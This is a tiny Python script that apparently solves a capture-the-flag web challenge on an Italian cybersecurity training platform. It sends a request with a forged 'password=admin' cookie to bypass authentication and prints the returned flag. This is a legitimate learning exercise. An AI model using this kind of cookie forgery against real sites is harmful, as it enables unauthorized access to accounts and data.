import requests

URL  = "http://web-05.challs.olicyber.it/flag"

cookie = {"password": "admin"}
r = requests.get(URL, cookies=cookie)

print(r.text)